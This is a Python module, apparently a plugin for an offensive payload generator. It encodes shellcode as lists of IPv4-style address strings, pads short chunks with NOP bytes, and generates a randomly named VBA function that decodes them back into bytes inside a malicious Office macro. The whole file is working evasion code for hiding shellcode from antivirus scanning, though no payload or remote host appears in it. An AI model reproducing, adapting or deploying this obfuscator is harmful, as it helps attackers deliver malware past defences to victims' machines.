import random
import string

class IPv4Obfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.decodedLength = len(decoded)
        for i in range(0, len(decoded), 4):
            chunk = decoded[i:i+4]
            if len(chunk) < 4:
                print(chunk)
                chunk = chunk + (b"\x90" * (4 - len(chunk)))
            encoded.append('.'.join([f'{chunk[n]}' for n in range(0, 4)]))
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
Private Function {self.name}(addresses)
    Dim arrayLength as Long
    Dim outArray() As Byte
    Dim octets() As string

    arrayLength = UBound(addresses) - LBound(addresses) + 1
    Redim outArray(arrayLength * 4)
    Dim i As Long
    For i=LBound(addresses) To UBound(addresses)
        octets = Split(addresses(i), ".")
        For j=LBound(octets) To UBound(octets)
            outArray(i*4 + j) = CLng(octets(j))
        Next j
    Next i

    Redim Preserve outArray(0 To {self.decodedLength} - 1)

    {self.name} = outArray
End Function
""".format(name = self.name)